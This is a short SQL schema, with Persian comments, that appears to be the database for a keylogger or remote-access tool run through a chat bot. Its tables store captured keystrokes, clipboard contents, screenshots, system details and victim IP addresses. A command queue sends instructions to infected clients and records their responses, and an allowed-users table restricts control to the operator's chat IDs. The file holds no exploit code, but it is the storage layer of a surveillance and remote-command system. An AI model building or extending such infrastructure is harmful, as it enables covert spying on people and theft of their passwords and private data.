CREATE TABLE client_data (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    keystrokes TEXT,
    screenshot_path VARCHAR(255),
    system_info JSON,
    received_at DATETIME NOT NULL,
    INDEX idx_client_id (client_id)
);

CREATE TABLE users (
    client_id VARCHAR(32) PRIMARY KEY,
    last_seen DATETIME NOT NULL,
    ip_address VARCHAR(45),
    last_ip VARCHAR(45)
);

-- اصلاح ساختار جدول commands
CREATE TABLE commands (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    command TEXT NOT NULL,
    response TEXT, -- تغییر از JSON به TEXT
    status ENUM('pending', 'sent', 'completed') NOT NULL DEFAULT 'pending',
    created_at DATETIME NOT NULL,
    completed_at DATETIME,
    INDEX idx_client_id_status (client_id, status)
);

CREATE TABLE allowed_users (
    chat_id BIGINT PRIMARY KEY,
    selected_client_id VARCHAR(32) NULL
);

CREATE TABLE user_typelogs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    chat_id BIGINT NOT NULL,
    keystrokes TEXT,
    created_at DATETIME NOT NULL
);

CREATE TABLE clipboard_logs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    content TEXT,
    created_at DATETIME NOT NULL,
    INDEX idx_client_id (client_id)
);

CREATE TABLE pending_uploads (
    id INT AUTO_INCREMENT PRIMARY KEY,
    chat_id VARCHAR(255) NOT NULL,
    file_id VARCHAR(255) NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO allowed_users (chat_id) VALUES ('YOUR_ADMIN_CHAT_ID');